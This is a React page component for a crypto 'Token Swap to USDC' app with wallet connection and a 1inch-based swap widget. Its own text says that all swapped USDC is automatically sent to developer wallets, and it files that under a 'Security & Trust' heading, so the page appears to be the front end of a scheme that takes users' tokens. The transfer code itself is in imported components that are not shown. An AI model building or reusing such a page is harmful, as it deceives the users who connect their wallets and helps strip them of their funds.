import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Button } from "@/components/ui/button";
import { MultiChainTokenSwap } from "@/components/swap/multi-chain-token-swap";
import { USDCCollectionMonitor } from "@/components/dashboard/usdc-collection-monitor";
import { useWagmiWallet } from "@/hooks/use-wagmi-wallet";
import { ReownWalletConnect } from "@/components/wallet/reown-wallet-connect";
import { ArrowUpDown, Shield, Zap, DollarSign, Wallet } from "lucide-react";

export default function Swap() {
  const { isConnected, address } = useWagmiWallet();

  if (!isConnected) {
    return (
      <div className="max-w-4xl mx-auto p-6">
        <div className="text-center py-12">
          <Wallet className="h-16 w-16 mx-auto mb-6 text-gray-400" />
          <h2 className="text-2xl font-bold mb-4">Connect Your Wallet</h2>
          <p className="text-gray-600 mb-6">
            Connect your wallet to swap tokens to USDC using live 1inch API integration
          </p>
          <ReownWalletConnect />
        </div>
      </div>
    );
  }

  return (
    <div className="max-w-6xl mx-auto p-6 space-y-8">
      {/* Page Header */}
      <div className="text-center">
        <h1 className="text-3xl font-bold mb-4">Token Swap to USDC</h1>
        <p className="text-gray-600 max-w-2xl mx-auto">
          Swap any token from your wallet to USDC using live 1inch API integration. 
          All USDC is automatically collected to developer wallets.
        </p>
      </div>

      {/* Main Swap Interface */}
      <div className="grid lg:grid-cols-2 gap-8">
        <div>
          <MultiChainTokenSwap />
        </div>
        
        <div className="space-y-6">
          {/* Features */}
          <Card>
            <CardHeader>
              <CardTitle className="flex items-center space-x-2">
                <Zap className="h-5 w-5 text-blue-600" />
                <span>Swap Features</span>
              </CardTitle>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="flex items-center space-x-3">
                <div className="w-2 h-2 bg-green-500 rounded-full"></div>
                <span className="text-sm">Live 1inch API integration</span>
              </div>
              <div className="flex items-center space-x-3">
                <div className="w-2 h-2 bg-green-500 rounded-full"></div>
                <span className="text-sm">Multi-chain support (Ethereum, Polygon, Arbitrum, Base)</span>
              </div>
              <div className="flex items-center space-x-3">
                <div className="w-2 h-2 bg-green-500 rounded-full"></div>
                <span className="text-sm">Automatic USDC collection</span>
              </div>
              <div className="flex items-center space-x-3">
                <div className="w-2 h-2 bg-green-500 rounded-full"></div>
                <span className="text-sm">Real-time price quotes</span>
              </div>
              <div className="flex items-center space-x-3">
                <div className="w-2 h-2 bg-green-500 rounded-full"></div>
                <span className="text-sm">Transaction monitoring</span>
              </div>
            </CardContent>
          </Card>

          {/* Security */}
          <Card>
            <CardHeader>
              <CardTitle className="flex items-center space-x-2">
                <Shield className="h-5 w-5 text-green-600" />
                <span>Security & Trust</span>
              </CardTitle>
            </CardHeader>
            <CardContent className="space-y-3">
              <div className="p-3 bg-green-50 border border-green-200 rounded-lg">
                <div className="flex items-center space-x-2 mb-2">
                  <Badge className="bg-green-100 text-green-800">Live API</Badge>
                  <span className="font-medium text-green-900">1inch Integration</span>
                </div>
                <p className="text-sm text-green-700">
                  Direct integration with 1inch DEX aggregator for best rates
                </p>
              </div>
              
              <div className="p-3 bg-blue-50 border border-blue-200 rounded-lg">
                <div className="flex items-center space-x-2 mb-2">
                  <Badge className="bg-blue-100 text-blue-800">Automatic</Badge>
                  <span className="font-medium text-blue-900">USDC Collection</span>
                </div>
                <p className="text-sm text-blue-700">
                  All swapped USDC automatically sent to developer wallets
                </p>
              </div>
            </CardContent>
          </Card>
        </div>
      </div>

      {/* USDC Collection Monitor */}
      <USDCCollectionMonitor />

      {/* Additional Information */}
      <Card className="border-blue-200 bg-blue-50">
        <CardContent className="p-6">
          <div className="flex items-center space-x-3">
            <DollarSign className="h-6 w-6 text-blue-600" />
            <div>
              <h3 className="font-semibold text-blue-900">Live Blockchain Integration</h3>
              <p className="text-blue-700">
                This platform connects directly to your wallet and blockchain networks to fetch real token balances 
                and execute authentic swaps using your 1inch API key. No demo or mock data is used.
              </p>
            </div>
          </div>
        </CardContent>
      </Card>
    </div>
  );
}